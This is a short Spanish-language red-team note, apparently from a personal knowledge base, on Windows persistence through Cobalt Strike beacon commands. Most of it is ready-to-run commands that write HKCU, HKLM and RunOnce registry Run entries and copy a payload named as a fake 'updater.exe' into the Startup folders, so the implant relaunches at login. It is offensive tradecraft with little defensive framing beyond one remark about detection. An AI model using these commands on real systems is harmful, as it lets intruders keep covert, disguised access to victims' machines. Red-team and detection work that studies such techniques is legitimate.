---
title: Persistencia — Registry Keys y Startup Folder
tags: [persistence, cobalt-strike, registry-run, startup]
---

# Registry Keys y Startup Folder

## Claves de Registro Run

### HKCU (sin privilegios elevados)

```
beacon> reg_set HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ C:\Users\<user>\AppData\Local\updater.exe
```

### HKLM (requiere admin)

```
beacon> reg_set HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run SystemUpdater REG_SZ C:\Windows\System32\updater.exe
```

### RunOnce (una sola vez)

```
beacon> reg_set HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce TempTask REG_SZ C:\Temp\task.exe
```

## Startup Folder

Copiar el payload a la carpeta de inicio:

```
beacon> upload C:\Payloads\updater.exe
beacon> cp updater.exe "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

### Para todos los usuarios (requiere admin):

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
```

## Verificar

```
beacon> reg query x64 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

> [!important] Run keys HKCU son el método más simple y no requieren privilegios — pero también los más vigilados por herramientas de detección.
